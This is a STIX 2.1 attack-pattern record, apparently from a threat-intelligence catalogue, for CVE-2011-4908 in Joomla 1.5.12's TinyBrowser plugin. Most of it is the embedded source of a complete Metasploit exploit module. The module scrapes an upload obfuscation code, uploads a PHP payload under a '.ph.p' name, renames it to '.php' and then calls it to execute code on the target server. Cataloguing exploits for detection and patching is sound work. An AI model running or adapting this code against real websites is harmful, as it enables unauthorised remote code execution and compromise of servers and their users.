{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--e4d65faa-4f71-46b6-9ffb-513be5e6bb3b",
    "created": "2024-08-14T17:13:00.945066Z",
    "modified": "2024-08-14T17:13:00.94507Z",
    "name": "Joomla 1.5.12 TinyBrowser File Upload Code Execution",
    "description": " This module exploits a vulnerability in the TinyMCE/tinybrowser plugin. This plugin is not secured in version 1.5.12 of joomla and allows the upload of files on the remote server. By renaming the uploaded file this vulnerability can be used to upload/execute code on the affected system. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/webapp/joomla_tinybrowser.rb",
            "external_id": "joomla_tinybrowser.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2011-4908"
        },
        {
            "source_name": "reference",
            "url": "http://developer.joomla.org/security/news/301-20090722-core-file-upload.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Joomla 1.5.12 TinyBrowser File Upload Code Execution',\n      'Description'    => %q{\n          This module exploits a vulnerability in the TinyMCE/tinybrowser plugin.\n        This plugin is not secured in version 1.5.12 of joomla and allows the upload\n        of files on the remote server.\n        By renaming the uploaded file this vulnerability can be used to upload/execute\n        code on the affected system.\n      },\n      'Author'         => [ 'spinbad <spinbad.security[at]googlemail.com>' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          ['CVE', '2011-4908'],\n          ['OSVDB', '64578'],\n          ['EDB', '9296'],\n          ['URL', 'http://developer.joomla.org/security/news/301-20090722-core-file-upload.html'],\n        ],\n      'Privileged'     => false,\n      'Payload'        =>\n        {\n          'DisableNops' => true,\n          'Compat'      =>\n            {\n              'ConnectionType' => 'find',\n            },\n          'Space'       => 1024,\n        },\n      'Platform'       => 'php',\n      'Arch'           => ARCH_PHP,\n      'Targets'        => [[ 'Automatic', { }]],\n      'DisclosureDate' => '2009-07-22',\n      'DefaultTarget'  => 0))\n\n      register_options(\n        [\n          OptString.new('URI', [true, \"Joomla directory path\", \"/\"]),\n        ])\n  end\n\n  def check\n    uri = normalize_uri(datastore['URI'], 'plugins/editors/tinymce/jscripts/tiny_mce/plugins/tinybrowser/upload.php')\n    uri << '?type=file&folder='\n    res = send_request_raw(\n      {\n        'uri' => uri\n      }, 25)\n\n    if (res and res.body =~ /flexupload.swf/)\n      return Exploit::CheckCode::Appears\n    end\n\n    return Exploit::CheckCode::Safe\n  end\n\n\n  def retrieve_obfuscation()\n\n  end\n\n\n  def exploit\n\n    cmd_php = '<?php ' + payload.encoded + '?>'\n\n    # Generate some random strings\n    cmdscript\t= rand_text_alpha_lower(20)\n    boundary    = rand_text_alphanumeric(6)\n\n    # Static files\n    directory \t= '/images/stories/'\n    uri_base    = normalize_uri(datastore['URI'])\n    uri_base << '/' if uri_base[-1,1] != '/'\n    uri_base << 'plugins/editors/tinymce/jscripts/tiny_mce/plugins/tinybrowser'\n\n    # Get obfuscation code (needed to upload files)\n    obfuscation_code = nil\n\n    res = send_request_raw({\n      'uri'     => uri_base + '/upload.php?type=file&folder='\n    }, 25)\n\n    if (res)\n\n      if(res.body =~ /\"obfus\", \"((\\w)+)\"\\)/)\n        obfuscation_code = $1\n        print_good(\"Successfully retrieved obfuscation code: #{obfuscation_code}\")\n      else\n        print_error(\"Error retrieving obfuscation code!\")\n        return\n      end\n    end\n\n\n\n    # Upload shellcode (file ending .ph.p)\n    data = \"--#{boundary}\\r\\nContent-Disposition: form-data; name=\\\"Filename\\\"\\r\\n\\r\\n\"\n    data << \"#{cmdscript}.ph.p\\r\\n--#{boundary}\"\n    data << \"\\r\\nContent-Disposition: form-data; name=\\\"Filedata\\\"; filename=\\\"#{cmdscript}.ph.p\\\"\\r\\n\"\n    data << \"Content-Type: application/octet-stream\\r\\n\\r\\n\"\n    data << cmd_php\n    data << \"\\r\\n--#{boundary}--\"\n\n    res = send_request_raw({\n      'uri'\t  => uri_base + \"/upload_file.php?folder=\" + directory + \"&type=file&feid=&obfuscate=#{obfuscation_code}&sessidpass=\",\n      'method'  => 'POST',\n      'data'    => data,\n      'headers' =>\n      {\n        'Content-Length' => data.length,\n        'Content-Type'\t => 'multipart/form-data; boundary=' + boundary,\n      }\n    }, 25)\n\n    if (res and res.body =~ /File Upload Success/)\n      print_good(\"Successfully Uploaded #{cmdscript}.ph.p\")\n    else\n      print_error(\"Error uploading #{cmdscript}.ph.p\")\n    end\n\n\n    # Complete the upload process (rename file)\n    print_status(\"Renaming file from #{cmdscript}.ph.p_ to #{cmdscript}.ph.p\")\n    res = send_request_raw({\n      'uri'     => uri_base + '/upload_process.php?folder=' + directory + '&type=file&feid=&filetotal=1'\n    })\n\n\n    # Rename the file from .ph.p to .php\n    res = send_request_cgi(\n      {\n        'method'    => 'POST',\n        'uri'       => uri_base + '/edit.php?type=file&folder=',\n        'vars_post' =>\n        {\n          'actionfile[0]' => \"#{cmdscript}.ph.p\",\n          'renameext[0]'   => 'p',\n          'renamefile[0]' => \"#{cmdscript}.ph\",\n          'sortby' => 'name',\n          'sorttype' => 'asc',\n          'showpage' => '0',\n          'action' => 'rename',\n          'commit' => '',\n        }\n      }, 10)\n\n    if (res and res.body =~ /successfully renamed./)\n      print_status(\"Renamed #{cmdscript}.ph.p to #{cmdscript}.php\")\n    else\n      print_error(\"Failed to rename #{cmdscript}.ph.p to #{cmdscript}.php\")\n    end\n\n\n    # Finally call the payload\n    print_status(\"Calling payload: #{cmdscript}.php\")\n    uri = normalize_uri(datastore['URI'])\n    uri << '/' if uri[-1,1] != '/'\n    uri << directory + cmdscript + \".php\"\n    res = send_request_raw({\n      'uri'\t=> uri\n    }, 25)\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2009-07-22",
    "x_mitre_platforms": [
        "php'"
    ]
}